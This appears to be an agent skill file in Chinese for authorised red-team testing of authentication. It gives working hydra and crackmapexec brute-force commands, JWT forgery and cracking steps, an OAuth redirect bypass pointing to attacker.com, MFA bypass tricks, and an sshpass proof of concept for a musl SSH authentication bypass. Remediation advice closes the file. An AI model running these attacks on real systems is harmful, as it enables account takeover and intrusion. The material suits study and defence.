---
name: redteam-auth
description: "认证与授权漏洞测试 — 密码策略、JWT/Token、OAuth、MFA 绕过。授权安全测试使用。"
version: 1.1.0
author: Hermes Agent (inspired by VulnClaw redteam-auth-detail-pack)
license: MIT
metadata:
  hermes:
    tags: [authentication, authorization, jwt, oauth, mfa-bypass, session-security]
---

# 认证与授权漏洞测试

## 密码策略测试

```bash
# 弱密码检测
hydra -L users.txt -P passwords.txt TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# 密码喷洒（防锁定）
crackmapexec smb TARGET -u users.txt -p 'Password123' --continue-on-success
```

## JWT 攻击

```bash
# 算法混淆（RS256 → HS256）
# 1. 获取公钥
curl -s https://TARGET/.well-known/jwks.json

# 2. 用公钥作为 HMAC 密钥签名
python3 -c "
import jwt
token = jwt.encode({'user': 'admin'}, 'PUBLIC_KEY_CONTENT', algorithm='HS256')
print(token)
"

# 空算法（none）
# 修改 header: {"alg": "none"}

# 密钥爆破
hashcat -m 16500 jwt.txt wordlist.txt
```

## OAuth 攻击

- redirect_uri 绕过：`https://TARGET/callback?redirect_uri=https://attacker.com`
- state 参数缺失/可预测
- 授权码拦截（无 PKCE）

## MFA 绕过

- 暴力破解 6 位数字（无速率限制时）
- 响应篡改：`{"success": false}` → `{"success": true}`
- 跳过 MFA 步骤直接访问后续端点

## SSH 认证绕过（基础设施面，CVE-2026-123158 "*sshole"，2026-11 在野利用）

musl libc + 非 PAM sshd 的无凭证认证绕过。**五条件全满足才暴露，缺一即免疫**：musl 环境（Alpine/OpenWrt+openssh-server/Buildroot/Yocto-musl，含大量 Docker 基础镜像）+ 密码校验不走 PAM + `PasswordAuthentication yes` + 目标账户 shadow 字段为 `*`（密钥专用/系统账户）+ 本机存在真实 `$5$`/`$6$` 哈希（sshd 借盐）；root 直登另需 `PermitRootLogin yes`。

```bash
# 条件预判：确认密码认证开启 + 目标属 musl 环境
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no -v user@TARGET 2>&1 | grep -i "authmethods\|password"

# 判定签名：对 shadow='*' 账户发 257-1024 字节密码（在野样本=重复'A'），认证成功即坐实
sshpass -p "$(python3 -c 'print("A"*300)')" ssh -o PubkeyAuthentication=no user@TARGET 'id'

# 长度边界差分（证明命中本漏洞而非弱口令）：256 字节应失败
sshpass -p "$(python3 -c 'print("A"*256)')" ssh -o PubkeyAuthentication=no user@TARGET 'id'
```

- 机制：musl `crypt()` 对 >256 字节输入失败返回 `"*"`，与 shadow 存储的 `*`（禁密码登录约定）碰撞，非 PAM 路径直接判等放行。持有真实哈希的账户不可绕过。
- 修复：OpenSSH 10.6p2 / Alpine 全分支补丁；兜底 `PasswordAuthentication no` 或密码校验启用 PAM。**banner 会骗人**——反向移植补丁保留旧版本号，须核对发行版包版本（`apk info openssh`）而非 `ssh -V`。
- 完整条件矩阵/IOC/检测要点：knowledge-base/knowledge/cve-2026-123158-sshhole-musl-auth-bypass.md（gap-20261110-001）

## 修复建议

1. 强密码策略 + 账户锁定
2. JWT 使用 RS256 + 密钥轮换
3. OAuth 强制 PKCE + state 参数
4. MFA 速率限制 + 防重放
5. SSH 基础设施（musl 环境）：禁用密码认证或启用 PAM，核对包版本而非 banner（CVE-2026-123158）

## 参考资源

- OWASP Authentication Cheat Sheet
- JWT Security Best Practices
